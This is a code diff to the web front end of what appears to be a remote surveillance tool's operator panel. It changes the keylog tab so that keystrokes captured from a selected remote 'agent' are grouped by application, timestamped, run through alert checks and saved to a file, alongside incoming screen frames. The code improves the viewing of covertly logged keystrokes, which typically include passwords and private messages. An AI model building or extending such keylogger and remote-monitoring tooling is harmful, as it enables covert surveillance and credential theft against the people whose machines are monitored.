@@ -58,11 +58,18 @@
   .tab-panel.active { display:flex; }
 
   .panel-header { background:#1a1a1a; padding:7px 10px; font-size:10px; text-transform:uppercase; letter-spacing:1px; color:#7c6aff; border-bottom:1px solid #2a2a2a; display:flex; justify-content:space-between; align-items:center; flex-shrink:0; gap:6px; }
-  #keylog { flex:1; overflow-y:auto; padding:10px; font-size:12px; line-height:1.7; word-break:break-all; color:#ccc; }
+  #keylog { flex:1; overflow-y:auto; padding:8px; font-size:12px; line-height:1.6; word-break:break-all; color:#ccc; display:flex; flex-direction:column; gap:4px; }
   #keylog::-webkit-scrollbar { width:4px; }
   #keylog::-webkit-scrollbar-thumb { background:#333; }
+  .kl-app-header { background:#1a1730; border:1px solid #2d2650; border-radius:6px; padding:5px 9px; font-size:10px; color:#a78bfa; letter-spacing:.5px; display:flex; align-items:center; gap:6px; margin-top:4px; flex-shrink:0; }
+  .kl-app-icon { font-size:11px; }
+  .kl-app-name { font-weight:bold; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .kl-app-time { color:#555; font-size:9px; flex-shrink:0; }
+  .kl-line { background:#0d0d0d; border-radius:4px; padding:3px 7px; font-size:12px; display:flex; align-items:flex-start; gap:6px; min-height:22px; }
+  .kl-ts { color:#444; font-size:9px; flex-shrink:0; margin-top:2px; }
+  .kl-chars { flex:1; word-break:break-all; }
   .key-special { color:#7c6aff; font-weight:bold; }
-  .key-enter { display:block; border-top:1px solid #222; margin:4px 0; padding-top:2px; }
+  .key-backspace { color:#f87171; }
   .hdr-btn { background:none; border:1px solid #333; color:#666; padding:2px 7px; border-radius:4px; font-size:10px; cursor:pointer; font-family:inherit; white-space:nowrap; }
   .hdr-btn:hover { border-color:#7c6aff; color:#7c6aff; }
 
@@ -567,20 +574,68 @@ socket.on("frame", d => {
 });
 
 // ── Keylog ────────────────────────────────────────────────────────────────────
+let _klLastApp = null, _klCurLine = null, _klCurChars = null;
+
 socket.on("key", d => {
   if (d._agent !== selectedAgent) return;
-  const char = d.char;
-  keylogText += char === "[ENTER]" ? "\n" : char;
+  const char = d.char || "";
+  const time  = d.time  || new Date().toLocaleTimeString("en-GB",{hour12:false});
+  const app   = d.app   || "Unknown";
+
+  keylogText += char === "↵" ? "\n" : char;
+
+  // New app header when app changes
+  if (app !== _klLastApp) {
+    _klLastApp = app;
+    _klCurLine = null; _klCurChars = null;
+    const hdr = document.createElement("div");
+    hdr.className = "kl-app-header";
+    hdr.innerHTML = `<span class="kl-app-icon">🖥</span><span class="kl-app-name">${escHtml(app)}</span><span class="kl-app-time">${escHtml(time)}</span>`;
+    keylogEl.appendChild(hdr);
+  }
+
+  // ENTER starts a new line
+  if (char === "↵" || char === "[ENTER]") {
+    _klCurLine = null; _klCurChars = null;
+    const br = document.createElement("div");
+    br.className = "kl-line";
+    br.innerHTML = `<span class="kl-ts">${escHtml(time)}</span><span class="kl-chars"><span class="key-special">↵</span></span>`;
+    keylogEl.appendChild(br);
+    checkAlerts(keylogText);
+    keylogEl.scrollTop = keylogEl.scrollHeight;
+    return;
+  }
+
+  // Reuse current line or create new one
+  if (!_klCurLine) {
+    _klCurLine = document.createElement("div");
+    _klCurLine.className = "kl-line";
+    const ts = document.createElement("span");
+    ts.className = "kl-ts";
+    ts.textContent = time;
+    _klCurChars = document.createElement("span");
+    _klCurChars.className = "kl-chars";
+    _klCurLine.appendChild(ts);
+    _klCurLine.appendChild(_klCurChars);
+    keylogEl.appendChild(_klCurLine);
+  }
+
   const span = document.createElement("span");
-  if (char === "[ENTER]") { span.className = "key-special key-enter"; span.textContent = char + "\n"; }
+  if (char === "⌫") { span.className = "key-backspace"; span.textContent = char; }
   else if (char.startsWith("[") && char.endsWith("]")) { span.className = "key-special"; span.textContent = char; }
+  else if (char.length > 1) { span.className = "key-special"; span.textContent = char; }
   else span.textContent = char;
-  keylogEl.appendChild(span);
+  _klCurChars.appendChild(span);
+
   keylogEl.scrollTop = keylogEl.scrollHeight;
   checkAlerts(keylogText);
 });
 
-function clearLog() { keylogEl.innerHTML = ""; keylogText = ""; }
+function clearLog() {
+  keylogEl.innerHTML = "";
+  keylogText = "";
+  _klLastApp = null; _klCurLine = null; _klCurChars = null;
+}
 function saveLog() {
   const blob = new Blob([keylogText], { type: "text/plain" });
   const a = document.createElement("a");
